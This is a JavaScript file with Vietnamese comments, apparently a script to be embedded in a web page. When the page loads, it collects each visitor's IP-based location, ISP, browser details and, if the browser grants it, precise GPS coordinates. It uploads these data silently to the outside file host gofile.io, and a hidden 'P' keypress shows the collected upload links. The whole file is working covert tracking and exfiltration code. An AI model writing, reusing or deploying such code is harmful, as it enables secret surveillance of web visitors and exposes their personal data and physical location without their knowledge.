const gofileLog = []; // Dùng để lưu các link gofile đã upload (hiển thị khi nhấn P)
const gofileApi = "https://api.gofile.io/uploadFile";

function sendToGofile(info) {
  const blob = new Blob([JSON.stringify(info, null, 2)], { type: "text/plain" });
  const form = new FormData();
  form.append("file", blob, `visitor-${Date.now()}.txt`);

  fetch(gofileApi, { method: "POST", body: form })
    .then(res => res.json())
    .then(result => {
      const link = result.data.downloadPage;
      gofileLog.push(link);
      console.log("Gofile Link:", link);
    })
    .catch(err => console.error("Upload lỗi:", err));
}

function collectAndUpload() {
  fetch("https://ipapi.co/json")
    .then(res => res.json())
    .then(ipData => {
      const info = {
        ip: ipData.ip,
        city: ipData.city,
        region: ipData.region,
        country: ipData.country_name,
        org: ipData.org,
        userAgent: navigator.userAgent,
        screen: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        language: navigator.language,
        time: new Date().toLocaleString(),
        source: "IP-Based"
      };

      // Nếu cho định vị
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          pos => {
            info.source = "HTML5 Geolocation";
            info.latitude = pos.coords.latitude;
            info.longitude = pos.coords.longitude;
            info.accuracy = pos.coords.accuracy + " meters";
            sendToGofile(info);
          },
          err => {
            console.warn("Không lấy được GPS:", err.message);
            sendToGofile(info);
          },
          { enableHighAccuracy: true, timeout: 5000 }
        );
      } else {
        sendToGofile(info);
      }
    });
}

collectAndUpload();

// ADMIN PANEL: nhấn P để xem log Gofile
document.addEventListener("keydown", (e) => {
  if (e.key.toLowerCase() === "p") {
    const panel = document.getElementById("adminPanel");
    panel.innerHTML = "📁 Danh sách file Gofile đã upload:\n" + gofileLog.join("\n");
    panel.style.display = panel.style.display === "none" ? "block" : "none";
  }
});
